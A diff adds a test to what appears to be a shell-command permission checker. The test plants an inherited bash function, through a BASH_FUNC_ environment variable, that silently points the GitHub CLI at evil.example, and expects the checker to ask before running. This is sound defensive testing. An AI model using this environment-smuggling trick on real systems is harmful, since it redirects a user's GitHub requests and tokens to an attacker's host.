@@ -116,3 +116,10 @@ def test_other_ways_to_change_the_environment_ask(command: str) -> None:
 )
 def test_plain_forms_without_an_environment_change_stay_allowed(command: str) -> None:
     assert decide(command) == "allow"
+
+
+def test_an_inherited_function_beside_gh_asks(monkeypatch: pytest.MonkeyPatch) -> None:
+    command = "redirect; gh issue comment 1 -R furedea/agent-config -b ok"
+    assert decide(command) == "allow"
+    monkeypatch.setenv("BASH_FUNC_redirect%%", "() {  export GH_HOST=evil.example\n}")
+    assert decide(command) == "ask"
